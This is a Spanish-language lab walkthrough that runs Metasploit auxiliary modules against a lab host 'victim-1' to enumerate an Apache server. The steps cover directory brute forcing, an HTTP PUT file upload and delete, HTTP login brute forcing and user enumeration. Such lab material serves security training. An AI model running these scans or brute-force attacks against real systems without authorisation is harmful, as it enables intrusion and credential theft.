# 🌐 Enumeración de Apache con Metasploit

## 🔍 Verificación del objetivo

```bash
ping -c 5 victim-1
```

El host `victim-1` es accesible antes de proceder.

## 🧰 Módulos auxiliares empleados

| Módulo | Propósito |
|--------|-----------|
| `auxiliary/scanner/http/http_version` | Obtener versión del servidor HTTP |
| `auxiliary/scanner/http/robots_txt` | Leer el archivo `robots.txt` |
| `auxiliary/scanner/http/http_header` | Capturar cabeceras HTTP (generales o de una ruta concreta) |
| `auxiliary/scanner/http/brute_dirs` | Fuerza bruta de directorios |
| `auxiliary/scanner/http/dir_scanner` | Escaneo de directorios con diccionario personalizado |
| `auxiliary/scanner/http/dir_listing` | Verificar si un directorio permite listado |
| `auxiliary/scanner/http/files_dir` | Enumerar archivos dentro de un directorio |
| `auxiliary/scanner/http/http_put` | Subir o eliminar archivos mediante PUT/DELETE |
| `auxiliary/scanner/http/http_login` | Ataque de fuerza bruta a formularios de autenticación HTTP |
| `auxiliary/scanner/http/apache_userdir_enum` | Enumerar usuarios de Apache (`~usuario`) |

## ⚙️ Ejecución de los módulos

### 1. Versión del servidor

```bash
msfconsole -q
use auxiliary/scanner/http/http_version
set RHOSTS victim-1
run
```

### 2. robots.txt

```bash
use auxiliary/scanner/http/robots_txt
set RHOSTS victim-1
run
```

### 3. Cabeceras HTTP

Cabeceras generales:

```bash
use auxiliary/scanner/http/http_header
set RHOSTS victim-1
run
```

Cabeceras de una ruta específica (`/secure`):

```bash
use auxiliary/scanner/http/http_header
set RHOSTS victim-1
set TARGETURI /secure
run
```

### 4. Fuerza bruta de directorios

```bash
use auxiliary/scanner/http/brute_dirs
set RHOSTS victim-1
run
```

### 5. Escaneo de directorios con diccionario

```bash
use auxiliary/scanner/http/dir_scanner
set RHOSTS victim-1
set DICTIONARY /usr/share/metasploit-framework/data/wordlists/directory.txt
run
```

### 6. Listado de directorios

```bash
use auxiliary/scanner/http/dir_listing
set RHOSTS victim-1
set PATH /data
run
```

### 7. Archivos en un directorio

```bash
use auxiliary/scanner/http/files_dir
set RHOSTS victim-1
set VERBOSE false
run
```

### 8. Subir / eliminar archivos con PUT

Subida de un archivo de prueba:

```bash
use auxiliary/scanner/http/http_put
set RHOSTS victim-1
set PATH /data
set FILENAME test.txt
set FILEDATA "Welcome To AttackDefense"
run
```

Verificación de la subida:

```bash
wget http://victim-1:80/data/test.txt
cat test.txt
```
Contenido: `Welcome To AttackDefense`

Eliminación del archivo:

```bash
use auxiliary/scanner/http/http_put
set RHOSTS victim-1
set PATH /data
set FILENAME test.txt
set ACTION DELETE
run
```

Confirmación de la eliminación:

```bash
wget http://victim-1:80/data/test.txt
```
Se recibe un error **404 – Archivo no encontrado**.

### 9. Ataque de fuerza bruta en autenticación HTTP

```bash
use auxiliary/scanner/http/http_login
set RHOSTS victim-1
set AUTH_URI /secure/
set VERBOSE false
run
```

### 10. Enumeración de usuarios de Apache

```bash
use auxiliary/scanner/http/apache_userdir_enum
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set RHOSTS victim-1
set VERBOSE false
run
```

---

📌 Todos los módulos se ejecutan contra el mismo objetivo (`victim-1`) y permiten inspeccionar la configuración del servidor Apache, directorios expuestos, métodos HTTP permitidos y posibles credenciales.
